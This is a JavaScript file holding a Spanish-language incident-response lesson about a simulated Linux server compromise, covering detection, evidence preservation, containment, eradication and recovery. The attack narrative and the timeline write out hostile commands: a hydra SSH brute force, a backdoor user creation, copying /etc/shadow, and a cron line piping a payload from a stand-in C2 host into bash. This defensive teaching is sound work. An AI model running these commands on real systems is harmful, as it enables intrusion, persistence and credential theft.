const content = `
## Módulo 8 — Proyecto real: detectar y responder a un ataque simulado

### 🎯 Objetivos de aprendizaje
* Aplicar las fases de respuesta a incidentes en un escenario realista de punta a punta
* Detectar indicadores de compromiso usando herramientas nativas de Linux
* Contener, erradicar y recuperar el sistema siguiendo metodología IR
* Documentar hallazgos con evidencia técnica concreta

### ❓ El problema real
Este módulo integra todo lo aprendido en el nivel 25. En lugar de teoría, trabajas con un escenario completo: un servidor fue comprometido, tú eres el analista IR, y tienes que reconstruir qué pasó, detener el daño, y dejar el sistema limpio. La narrativa del ataque se describe primero para que entiendas qué deberías encontrar — en un incidente real, no tendrías esta ventaja.

### 📖 Estructura del proyecto

\`\`\`
webserver-01
├── /var/log/fail2ban.log
├── /var/log/auth.log
├── /etc/passwd (usuario backdoor h4ck3r, UID 1337)
├── /var/spool/cron/crontabs/backup (cron malicioso)
└── /tmp/.hidden_data (copia exfiltrada de /etc/shadow)

/root/evidence-<timestamp>/
├── logs.tar.gz
├── connections.txt
├── active_sessions.txt
├── processes.txt
├── lsof.txt
├── backup_crontab.txt
├── passwd.bak / shadow.bak
├── exfiltrated_shadow.bak
└── hashes.sha256
\`\`\`

### 📖 Narrativa del ataque (lo que hizo el atacante)

El atacante ejecutó la siguiente secuencia de acciones en el servidor \`webserver-01\`:

**Paso 1 — Reconocimiento y fuerza bruta SSH**

El atacante identificó el puerto SSH abierto (22) y lanzó un ataque de diccionario con la herramienta \`hydra\` usando una lista de contraseñas comunes. fail2ban estaba configurado pero con un umbral de 10 intentos, permitiendo varios intentos antes del baneo.

\`\`\`
# Lo que el atacante ejecutó (desde su máquina):
hydra -l backup -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.50
# Resultado: [22][ssh] host: 192.168.1.50 login: backup password: backup123
\`\`\`

**Paso 2 — Acceso inicial**

Con las credenciales obtenidas, el atacante se conectó al servidor:
\`\`\`
ssh backup@192.168.1.50
# Login exitoso a las 03:47:22 UTC desde 203.0.113.45
\`\`\`

**Paso 3 — Persistencia mediante cron job malicioso**

\`\`\`bash
# El atacante agregó un cron job para descarga y ejecución continua de payload:
crontab -e   # como usuario backup
# Agregó la línea:
# */5 * * * * curl http://evil-c2.example.com/payload.sh | bash
\`\`\`

**Paso 4 — Creación de usuario backdoor**

\`\`\`bash
# Con sudo o explotando una vulnerabilidad local, el atacante obtuvo root y ejecutó:
useradd -M -s /bin/bash -u 1337 h4ck3r
echo "h4ck3r:\$6\$salt\$hash_de_password" >> /etc/passwd
# El UID 1337 es inusual y facilita la detección si sabes buscarlo
\`\`\`

**Paso 5 — Exfiltración de datos**

\`\`\`bash
# El atacante copió el archivo shadow a un directorio oculto en /tmp:
cp /etc/shadow /tmp/.hidden_data
# El archivo existe en el disco pero el nombre con punto lo oculta del ls básico
\`\`\`

### 📖 Fase 1 — Detección: encontrar los indicadores de compromiso

Recibes una alerta de tu sistema de monitoreo: tráfico saliente inusual desde \`webserver-01\` hacia una IP desconocida. Empiezas la investigación.

**1.1 — Revisar logs de fail2ban para detectar la fuerza bruta**

\`\`\`bash
grep "Ban" /var/log/fail2ban.log | tail -20
\`\`\`

Salida representativa:
\`\`\`
2024-01-15 03:44:15,823 fail2ban.actions [1234]: NOTICE  [sshd] Ban 203.0.113.45
2024-01-15 03:44:52,105 fail2ban.actions [1234]: NOTICE  [sshd] Ban 203.0.113.45
2024-01-15 03:45:30,441 fail2ban.actions [1234]: NOTICE  [sshd] Ban 203.0.113.47
\`\`\`

La misma IP \`203.0.113.45\` fue baneada múltiples veces — el atacante usó múltiples IPs o el baneo expiró entre intentos.

**1.2 — Confirmar el acceso exitoso en auth.log**

\`\`\`bash
grep "Accepted password" /var/log/auth.log | tail -20
\`\`\`

Salida:
\`\`\`
Jan 15 03:47:22 webserver-01 sshd[8821]: Accepted password for backup from 203.0.113.45 port 54231 ssh2
Jan 15 03:47:22 webserver-01 sshd[8821]: pam_unix(sshd:session): session opened for user backup by (uid=0)
\`\`\`

Confirmado: el usuario \`backup\` se autenticó desde \`203.0.113.45\` a las 03:47 UTC — hora inusual para actividad legítima.

**1.3 — Verificar sesiones activas y recientes**

\`\`\`bash
# Sesiones activas ahora mismo:
w
\`\`\`

Salida:
\`\`\`
 09:15:23 up 5 days,  2:31,  2 users,  load average: 0.12, 0.08, 0.05
USER     TTY      FROM             LOGIN@   IDLE JCPU   PCPU WHAT
admin    pts/0    10.0.0.5         09:10    1.00s  0.08s  0.01s w
backup   pts/1    203.0.113.45     03:47    5:28m  0.15s  0.15s bash
\`\`\`

El usuario \`backup\` lleva más de 5 horas conectado desde la IP externa. Sesión activa del atacante.

\`\`\`bash
# Historial de logins:
last | head -20
\`\`\`

Salida:
\`\`\`
backup   pts/1        203.0.113.45     Mon Jan 15 03:47   still logged in
admin    pts/0        10.0.0.5         Mon Jan 15 09:10   still logged in
backup   pts/1        203.0.113.45     Sun Jan 14 22:15 - 23:02  (00:47)
root     tty1                          Fri Jan 12 14:30 - 14:35  (00:05)
\`\`\`

El atacante también accedió la noche anterior — lleva al menos dos sesiones confirmadas.

**1.4 — Detectar el usuario backdoor**

\`\`\`bash
getent passwd | grep 1337
\`\`\`

Salida:
\`\`\`
h4ck3r:x:1337:1337::/nonexistent:/bin/bash
\`\`\`

Usuario con UID 1337, sin directorio home (\`/nonexistent\`), con shell interactiva. No es un usuario del sistema legítimo.

\`\`\`bash
# Verificar también usuarios con UID > 1000 que no deberían existir:
awk -F: '\$3 >= 1000 {print \$1, \$3, \$6, \$7}' /etc/passwd
\`\`\`

Salida:
\`\`\`
admin 1000 /home/admin /bin/bash
backup 1001 /var/backups /bin/sh
h4ck3r 1337 /nonexistent /bin/bash
\`\`\`

**1.5 — Encontrar el cron job malicioso**

\`\`\`bash
# Crontab del usuario backup:
crontab -l -u backup
\`\`\`

Salida:
\`\`\`
# m h  dom mon dow   command
*/5 * * * * curl http://evil-c2.example.com/payload.sh | bash
\`\`\`

Ejecuta un payload externo cada 5 minutos. Esto es tanto persistencia como mecanismo de reinfección.

\`\`\`bash
# Verificar también otros lugares donde pueden existir cron jobs:
ls -la /var/spool/cron/crontabs/
ls -la /etc/cron.d/
ls -la /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/
cat /etc/crontab
\`\`\`

**1.6 — Buscar archivos ocultos en directorios temporales**

\`\`\`bash
find /tmp /var/tmp /dev/shm -type f 2>/dev/null
\`\`\`

Salida:
\`\`\`
/tmp/.hidden_data
/tmp/tmux-1000/default
\`\`\`

\`\`\`bash
# Verificar qué contiene el archivo oculto:
file /tmp/.hidden_data
\`\`\`

Salida:
\`\`\`
/tmp/.hidden_data: ASCII text
\`\`\`

\`\`\`bash
head -3 /tmp/.hidden_data
\`\`\`

Salida:
\`\`\`
root:\$6\$rounds=656000\$salt\$hashedpassword:19737:0:99999:7:::
admin:\$6\$rounds=656000\$othersalt\$otherhash:19750:0:99999:7:::
backup:\$6\$rounds=656000\$moresalt\$morehash:19740:0:99999:7:::
\`\`\`

Es una copia del archivo \`/etc/shadow\` — los hashes de contraseñas de todos los usuarios fueron exfiltrados. **Este es el hallazgo más crítico: todas las contraseñas deben considerarse comprometidas.**

### 📖 Fase 2 — Preservación de evidencia

Antes de cualquier cambio, preserva el estado actual:

\`\`\`bash
# Crear directorio de evidencia con timestamp
EVIDENCE="/root/evidence-\$(date +%Y%m%d_%H%M%S)"
mkdir -p "\$EVIDENCE"

# Preservar logs
tar -czf "\$EVIDENCE/logs.tar.gz" /var/log/

# Estado de red actual (el atacante está conectado ahora)
ss -tnp > "\$EVIDENCE/connections.txt"
w > "\$EVIDENCE/active_sessions.txt"
ps aux --forest > "\$EVIDENCE/processes.txt"
lsof -i > "\$EVIDENCE/lsof.txt"

# Crontab del atacante (evidencia antes de eliminar)
crontab -l -u backup > "\$EVIDENCE/backup_crontab.txt" 2>&1

# Estado de /etc/passwd y shadow
cp /etc/passwd "\$EVIDENCE/passwd.bak"
cp /etc/shadow "\$EVIDENCE/shadow.bak"

# Archivar el archivo exfiltrado (evidencia del data breach)
cp /tmp/.hidden_data "\$EVIDENCE/exfiltrated_shadow.bak"

# Hash de integridad de toda la evidencia
sha256sum "\$EVIDENCE"/* > "\$EVIDENCE/hashes.sha256"

echo "Evidencia preservada en: \$EVIDENCE"
\`\`\`

### 📖 Fase 3 — Contención

\`\`\`bash
# Bloquear la IP del atacante (la sesión activa se terminará)
iptables -I INPUT -s 203.0.113.45 -j DROP
iptables -I OUTPUT -d 203.0.113.45 -j DROP

# Verificar que se aplicó:
iptables -L INPUT -n --line-numbers | head -5
\`\`\`

Salida:
\`\`\`
Chain INPUT (policy ACCEPT)
num  target     prot opt source               destination
1    DROP       all  --  203.0.113.45         0.0.0.0/0
\`\`\`

\`\`\`bash
# Bloquear la cuenta backup inmediatamente
usermod -L backup
chage -E 0 backup

# Verificar:
passwd -S backup
\`\`\`

Salida:
\`\`\`
backup L 2024-01-15 0 99999 7 -1 (Password locked.)
\`\`\`

\`\`\`bash
# Terminar la sesión activa del atacante (si persiste después del bloqueo de IP)
# Identificar el PID de su sesión:
ps aux | grep "pts/1"
# Terminar la sesión:
pkill -9 -t pts/1
\`\`\`

### 📖 Fase 4 — Eradicación

\`\`\`bash
# Eliminar el cron job malicioso
crontab -r -u backup

# Verificar que quedó vacío:
crontab -l -u backup
\`\`\`

Salida:
\`\`\`
no crontab for backup
\`\`\`

\`\`\`bash
# Eliminar el usuario backdoor
userdel h4ck3r

# Verificar que ya no existe:
getent passwd h4ck3r
# (sin salida = eliminado correctamente)

# Verificar /etc/passwd para confirmar:
grep "h4ck3r\|1337" /etc/passwd
# (sin salida = limpio)
\`\`\`

\`\`\`bash
# Ejecutar verificación de integridad con AIDE
aide --check
\`\`\`

Salida representativa:
\`\`\`
AIDE found differences between database and filesystem!!

File: /etc/passwd
  Size     : 1423              | 1456
  Mtime    : 2024-01-12 14:30  | 2024-01-15 03:51
  SHA256   : abc123...         | def456...

File: /etc/shadow
  Mtime    : 2024-01-12 14:30  | 2024-01-15 03:51

File: /bin/bash
  ...unchanged...
\`\`\`

\`\`\`bash
# Eliminar el archivo exfiltrado de /tmp
rm -f /tmp/.hidden_data

# Verificar que no quedaron otros archivos ocultos:
find /tmp /var/tmp -name ".*" -type f 2>/dev/null
# (sin salida = limpio)

# Verificar authorized_keys de todos los usuarios por claves SSH no autorizadas:
for user in \$(awk -F: '\$3 >= 1000 {print \$1}' /etc/passwd); do
    echo "=== \$user ==="
    cat /home/\$user/.ssh/authorized_keys 2>/dev/null || echo "(sin archivo)"
done
\`\`\`

\`\`\`bash
# Verificar /etc/sudoers por entradas no autorizadas:
visudo -c   # verifica sintaxis
grep -v "^#\|^$" /etc/sudoers
cat /etc/sudoers.d/* 2>/dev/null
\`\`\`

### 📖 Fase 5 — Recuperación

\`\`\`bash
# CRÍTICO: Cambiar TODAS las contraseñas (shadow fue comprometido)
passwd root
passwd admin
passwd backup

# Cambiar también cualquier otra cuenta de servicio con shell:
awk -F: '\$7 ~ /bash|sh|zsh/ && \$3 >= 1000 {print \$1}' /etc/passwd

# Generar nueva baseline de AIDE después de la limpieza:
aide --update
mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db

# Verificar que la nueva baseline está limpia:
aide --check
# Debe mostrar 0 diferencias si la eradicación fue completa
\`\`\`

\`\`\`bash
# Endurecer configuración SSH para prevenir recurrencia:
# En /etc/ssh/sshd_config:
# PasswordAuthentication no      (solo claves SSH)
# PermitRootLogin no             (deshabilitar root SSH)
# AllowUsers admin               (whitelist de usuarios)
# MaxAuthTries 3                 (reducir intentos antes de fail2ban)

# Recargar SSH:
systemctl reload sshd
\`\`\`

\`\`\`bash
# Endurecer fail2ban — reducir el umbral de intentos:
# En /etc/fail2ban/jail.local:
# [sshd]
# maxretry = 3
# bantime = 3600
# findtime = 600

systemctl restart fail2ban
fail2ban-client status sshd
\`\`\`

### 📖 Fase 6 — Documentación del timeline

El timeline reconstruido del incidente:

\`\`\`
TIMELINE DEL INCIDENTE — webserver-01

2024-01-14 22:15  Primera sesión del atacante (backup@203.0.113.45)
                  → Duración: 47 minutos
                  → Acciones probables: reconocimiento, instalación de cron job

2024-01-15 03:44  Inicio del ataque de fuerza bruta SSH (hydra)
                  → IPs atacantes: 203.0.113.45, 203.0.113.47
                  → fail2ban baneó las IPs pero el umbral de 10 era demasiado alto

2024-01-15 03:47  Acceso exitoso: usuario backup / contraseña backup123
                  → Sesión desde: 203.0.113.45:54231

2024-01-15 03:51  Modificación de /etc/passwd (creación de h4ck3r UID 1337)
                  → Evidencia: ctime de /etc/passwd

2024-01-15 03:51  Copia de /etc/shadow a /tmp/.hidden_data
                  → Todas las contraseñas del sistema comprometidas

2024-01-15 04:xx  Instalación de cron job malicioso en crontab de backup
                  → Payload: curl http://evil-c2.example.com/payload.sh | bash
                  → Frecuencia: cada 5 minutos

2024-01-15 09:12  Alerta del sistema de monitoreo por tráfico saliente anómalo

2024-01-15 09:15  Inicio de la respuesta al incidente
2024-01-15 09:20  Preservación de evidencia completada
2024-01-15 09:25  Contención: IP baneada, cuenta backup bloqueada
2024-01-15 09:30  Eradicación: cron eliminado, h4ck3r eliminado
2024-01-15 09:45  Recuperación: contraseñas cambiadas, AIDE actualizado
2024-01-15 10:00  Sistema declarado limpio, monitoreo intensivo activado

IMPACTO CONFIRMADO:
  - Hashes de contraseñas de todos los usuarios exfiltrados
  - Acceso root (vía backdoor h4ck3r) durante ~5 horas
  - Payload externo ejecutado ~60 veces (cada 5 min, ~5 horas)

VECTOR DE ENTRADA:
  - Contraseña débil en cuenta de servicio (backup / backup123)
  - Umbral de fail2ban demasiado alto (10 intentos)

LECCIONES APRENDIDAS:
  1. Las cuentas de servicio no deben tener contraseñas débiles ni shell interactiva
  2. El umbral de fail2ban debe ser ≤3 intentos para SSH
  3. PasswordAuthentication debe estar desactivado — solo claves SSH
  4. AIDE debe ejecutarse diariamente y generar alertas automáticas
  5. El monitoreo tardó 5+ horas en detectar la sesión activa del atacante
\`\`\`

### 📋 Lo que debes recordar
* Un shadow comprometido obliga a cambiar TODAS las contraseñas — los hashes pueden crackearse offline
* Verifica siempre: crontabs de usuarios, \`/etc/cron.d/\`, \`/etc/sudoers\`, \`authorized_keys\`, y cuentas con UID inusuales
* El orden es crítico: preservar evidencia → contener → erradicar → recuperar (nunca al revés)
* Un cron job con \`curl ... | bash\` es un mecanismo de persistencia y reinfección simultáneamente
* La detección tardía (5+ horas) se debe a falta de alertas activas — fail2ban y AIDE deben generar notificaciones
* Documenta el timeline mientras investigas, no al final: los timestamps son evidencia

### 🧪 Autoevaluación
1. El analista IR elimina el usuario \`h4ck3r\` y el cron job, pero no cambia las contraseñas porque "el atacante ya no tiene acceso". ¿Por qué esto es un error crítico?
2. ¿Qué tres comandos ejecutarías en los primeros 60 segundos de un incidente SSH sospechoso para determinar si el atacante sigue conectado?
3. El cron job malicioso ejecuta \`curl http://evil-c2.example.com/payload.sh | bash\` cada 5 minutos. Describes dos medidas técnicas independientes que cortarían este mecanismo permanentemente.

---

1. Es un error crítico porque el atacante ya copió \`/etc/shadow\` — tiene los hashes de todas las contraseñas y puede crackearlas offline con herramientas como \`hashcat\`. Una vez que tiene los hashes, no necesita acceso al sistema para obtener las contraseñas en texto claro. Las contraseñas comprometidas pueden usarse para acceder a otros sistemas donde los usuarios las reutilizaron, o para volver a entrar cuando se levante el bloqueo.
2. Los tres comandos: (1) \`w\` — muestra sesiones activas con IP de origen en tiempo real; (2) \`ss -tnp\` — muestra conexiones TCP establecidas con el proceso asociado, revelando si hay una shell reversa activa; (3) \`last | head -10\` — muestra los logins más recientes con hora e IP para confirmar si hubo acceso reciente y desde dónde.
3. Dos medidas independientes: (1) **Bloquear la conectividad de red saliente al dominio del atacante**: \`iptables -I OUTPUT -d evil-c2.example.com -j DROP\` — el cron se ejecutará pero el \`curl\` fallará sin poder contactar el C2. Más robusto aún: política de OUTPUT DROP con whitelist de destinos permitidos. (2) **Eliminar el intérprete de shell o restringir \`cron\` para el usuario**: revocar la shell interactiva de la cuenta con \`usermod -s /usr/sbin/nologin backup\` y eliminar su crontab con \`crontab -r -u backup\` — sin crontab no hay ejecución periódica, y sin shell el comando del cron no puede ejecutarse aunque el crontab existiera.
`

export default content
